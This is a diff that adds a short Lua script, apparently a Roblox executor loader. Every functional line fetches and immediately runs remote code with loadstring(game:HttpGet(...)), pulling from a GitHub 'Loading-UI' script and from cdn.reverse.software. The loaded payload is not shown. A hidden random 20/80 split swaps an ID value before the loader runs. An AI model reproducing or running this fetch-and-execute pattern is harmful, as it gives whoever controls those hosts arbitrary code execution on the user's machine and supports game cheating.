@@ -1,0 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilusion-scripts/Loading-UI/refs/heads/main/loading"))()
+
+
+local chance = math.random(1, 100)
+
+if chance <= 20 then
+    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+else
+    ID="ac8bea8a-1180-411d-9650-b0d5ace55b6a";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
